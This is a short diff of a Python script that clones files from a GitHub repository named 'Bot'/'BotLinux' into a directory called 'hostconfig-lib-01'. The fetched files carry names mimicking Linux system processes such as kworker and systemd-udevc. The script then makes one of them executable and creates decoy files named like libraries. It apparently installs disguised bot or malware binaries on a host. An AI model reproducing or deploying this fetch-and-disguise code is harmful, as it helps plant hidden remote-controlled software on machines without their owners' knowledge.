@@ -55,9 +55,9 @@ for i in roba:
     
     
 os.chdir("lsb")
-os.system("git clone https://github.com/Libx86/Bot.git/kworker_v8U:023FWE234-0 hostconfig-lib-01")
-os.system("git clone https://github.com/Libx86/Bot.git/systemd-udevc hostconfig-lib-01")
-os.system("git clone https://github.com/Libx86/Bot.git/at-spi2-regist3r.01F  hostconfig-lib-01")
+os.system("git clone https://github.com/Libx86/BotLinux.git/kworker_v8U:023FWE234-0 hostconfig-lib-01")
+os.system("git clone https://github.com/Libx86/BotLinux.git/systemd-udevc hostconfig-lib-01")
+os.system("git clone https://github.com/Libx86/BotLinux.git/at-spi2-regist3r.01F  hostconfig-lib-01")
 os.chdir("hostconfig-lib-01")
 os.system("chmod a+x kworker_v8U:023FWE234-0")
 os.system("touch lib01.h hostconfig-beta librighel2.6.04 libquadmath.so.02.3.2.h")
